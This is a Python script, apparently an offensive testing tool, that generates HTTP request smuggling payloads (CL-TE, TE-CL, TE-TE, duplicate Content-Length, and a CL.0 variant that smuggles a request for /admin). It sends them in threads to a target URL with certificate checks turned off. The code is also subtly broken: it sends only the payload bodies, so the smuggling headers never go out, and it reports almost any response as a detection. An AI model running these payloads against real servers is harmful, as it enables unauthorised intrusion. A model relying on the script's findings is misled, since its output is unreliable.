#!/usr/bin/env python3

import requests
import argparse
import threading
import time
import signal
import sys
from urllib.parse import urlparse
from colorama import Fore, Style, init
import warnings

warnings.filterwarnings("ignore")
init(autoreset=True)

stop_threads = False

def signal_handler(sig, frame):
    global stop_threads
    print(f"\n{Fore.RED}[!] Ctrl+C detected, exiting gracefully.")
    stop_threads = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def parse_args():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Tester")
    parser.add_argument('--url', help='Target URL (e.g., https://target.com)', required=False)
    parser.add_argument('--proxy', help='Proxy (e.g., http://127.0.0.1:8080)', required=False)
    parser.add_argument('--threads', help='Number of threads (default 5)', type=int, default=5)
    parser.add_argument('--rate-limit', help='Delay between requests in seconds (default 0)', type=float, default=0)
    parser.add_argument('--request-file', help='Load raw HTTP request from file', required=False)
    parser.add_argument('--follow-redirects', help='Follow redirects', action='store_true')
    parser.add_argument('--verbose', help='Enable verbose output', action='store_true')
    parser.add_argument('--timeout', help='Request timeout in seconds (default 10)', type=int, default=10)
    parser.add_argument('--exit-on-found', help='Exit if interesting response is found', action='store_true')
    return parser.parse_args()

def load_request_from_file(path):
    try:
        with open(path, 'r') as f:
            return f.read()
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to load request file: {e}")
        sys.exit(1)

def generate_payloads(base_request):
    # Split headers and body
    headers_part, _, body_part = base_request.partition('\r\n\r\n')

    payloads = []

    methods = ["POST", "GET"]
    for method in methods:
        # CL-TE
        payloads.append(f"{method} / HTTP/1.1\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
        # TE-CL
        payloads.append(f"{method} / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n")
        # TE-TE
        payloads.append(f"{method} / HTTP/1.1\r\nTransfer-Encoding: chunked,chunked\r\n\r\n0\r\n\r\n")
        # CL-CL (Dual Content-Length)
        payloads.append(f"{method} / HTTP/1.1\r\nContent-Length: 4\r\nContent-Length: 6\r\n\r\n0\r\n\r\n")
        # CL.0 (Content-Length: 0 + smuggled request)
        payloads.append(f"{method} / HTTP/1.1\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable\r\n\r\n")
    return payloads

def send_request(url, payload, args):
    parsed = urlparse(url)
    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    headers = {
        "Host": host,
        "User-Agent": "smuggle-tester/1.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
    }

    try:
        if args.verbose:
            print(f"{Fore.BLUE}[i] Sending payload to {url}...")
        session = requests.Session()
        response = session.request(
            method="POST",
            url=url,
            data=payload.split('\r\n\r\n', 1)[1],  # body after header
            headers=headers,
            proxies=proxies,
            timeout=args.timeout,
            verify=False,
            allow_redirects=args.follow_redirects
        )
        return response
    except Exception as e:
        return e

def smuggle_worker(args, payloads):
    for payload in payloads:
        if stop_threads:
            return
        try:
            response = send_request(args.url, payload, args)
            if isinstance(response, Exception):
                print(f"{Fore.RED}[ERROR] {response}")
            else:
                if args.verbose:
                    print(f"{Fore.GREEN}[+] Response Status: {response.status_code}")
                if response.status_code not in [400, 404]:
                    print(f"{Fore.YELLOW}[!] Potential Smuggling Detected! Status {response.status_code}")
                    if args.exit_on_found:
                        print(f"{Fore.RED}[!] Exiting after finding interesting response.")
                        sys.exit(0)
            if args.rate_limit > 0:
                time.sleep(args.rate_limit)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")

def main():
    args = parse_args()

    if not args.url and not args.request_file:
        print(f"{Fore.RED}[!] You must provide either --url or --request-file")
        sys.exit(1)

    if args.request_file:
        base_request = load_request_from_file(args.request_file)
        payloads = generate_payloads(base_request)
    else:
        base_request = "GET / HTTP/1.1\r\nHost: dummy\r\n\r\n"
        payloads = generate_payloads(base_request)

    threads = []
    payload_chunks = [payloads[i::args.threads] for i in range(args.threads)]

    for chunk in payload_chunks:
        t = threading.Thread(target=smuggle_worker, args=(args, chunk))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{Fore.CYAN}[+] Done testing for request smuggling.")

if __name__ == "__main__":
    main()
